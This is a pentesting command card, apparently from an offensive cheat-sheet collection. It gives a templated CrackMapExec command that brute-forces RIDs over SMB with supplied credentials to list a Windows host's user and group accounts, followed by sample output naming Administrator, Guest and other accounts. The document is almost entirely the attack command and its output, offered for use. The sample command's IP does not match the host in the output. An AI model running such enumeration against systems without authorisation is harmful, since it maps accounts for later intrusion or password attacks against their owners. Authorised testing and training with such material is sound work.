---
id: b78dd6d8-9168-4b70-94d1-6deaf8a2e816
name: CrackMapExec Brute Force SMB Users Using RID
type: command
executor: bash
data: crackmapexec smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD --rid-brute
output: 'root@kali:~# crackmapexec smb 10.10.10.10 -u ''bob'' -p ''secretpass'' --rid-brute

  SMB         10.10.10.149    445    Bob-PC           [*] Windows 10.0 Build 17763
  x64 (name:Bob-PC) (domain:WORKGROUP) (signing:False) (SMBv1:False)

  SMB         10.10.10.149    445    Bob-PC           [+] Bob-PC\bob:secretpass

  SMB         10.10.10.149    445    Bob-PC           [+] Brute forcing RIDs

  SMB         10.10.10.149    445    Bob-PC           500: Bob-PC\Administrator (SidTypeUser)

  SMB         10.10.10.149    445    Bob-PC           501: Bob-PC\Guest (SidTypeUser)

  SMB         10.10.10.149    445    Bob-PC           503: Bob-PC\DefaultAccount (SidTypeUser)

  SMB         10.10.10.149    445    Bob-PC           504: Bob-PC\WDAGUtilityAccount
  (SidTypeUser)

  SMB         10.10.10.149    445    Bob-PC           513: Bob-PC\None (SidTypeGroup)

  SMB         10.10.10.149    445    Bob-PC           1008: Bob-PC\Bob (SidTypeUser)'
created_at: '2019-12-27T22:38:42.675767+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# CrackMapExec Brute Force SMB Users Using RID

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD --rid-brute
```

## Expected Output

```
root@kali:~# crackmapexec smb 10.10.10.10 -u 'bob' -p 'secretpass' --rid-brute
SMB         10.10.10.149    445    Bob-PC           [*] Windows 10.0 Build 17763 x64 (name:Bob-PC) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    Bob-PC           [+] Bob-PC\bob:secretpass
SMB         10.10.10.149    445    Bob-PC           [+] Brute forcing RIDs
SMB         10.10.10.149    445    Bob-PC           500: Bob-PC\Administrator (SidTypeUser)
SMB         10.10.10.149    445    Bob-PC           501: Bob-PC\Guest (SidTypeUser)
SMB         10.10.10.149    445    Bob-PC           503: Bob-PC\DefaultAccount (SidTypeUser)
SMB         10.10.10.149    445    Bob-PC           504: Bob-PC\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.10.149    445    Bob-PC           513: Bob-PC\None (SidTypeGroup)
SMB         10.10.10.149    445    Bob-PC           1008: Bob-PC\Bob (SidTypeUser)
```


